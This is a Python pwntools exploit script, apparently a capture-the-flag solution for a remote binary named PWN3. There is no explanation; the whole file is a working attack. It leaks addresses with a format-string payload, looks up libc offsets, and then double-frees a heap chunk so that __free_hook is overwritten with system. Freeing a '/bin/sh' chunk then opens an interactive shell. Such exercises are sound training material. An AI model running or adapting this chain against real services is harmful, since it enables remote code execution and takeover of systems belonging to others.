from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
#p=process("./PWN3")
io=remote('redirect.do-not-trust.hacking.run',10196)
elf=ELF("./PWN3")
def add(size,story):
    io.sendlineafter('choice:','1')
    io.sendlineafter('story:',str(size))
    io.sendlineafter('story:',story)
def free(idx):
    io.sendlineafter('choice:','4')
    io.sendlineafter('index:',str(idx))
io.recvuntil("name?")
io.sendline("%p%p%p%p%p%paaaa")
io.recv()
io.sendline("aaaa")
elf_addr=int(io.recvuntil("aaaa")[-18:-4],16)-9
print(hex(elf_addr))
libc=LibcSearcher('_IO_file_setbuf',elf_addr)
libcbase=elf_addr-libc.dump('_IO_file_setbuf')
system_addr=libcbase+libc.dump('system')
free_hook=libcbase+libc.dump('__free_hook')
add(32,b'aaaa')
add(32,b'/bin/sh\x00')
free(0)
free(0)
add(32,p64(free_hook))
add(32,b'aaaa')
add(32,p64(system_addr))
free(1)
io.interactive()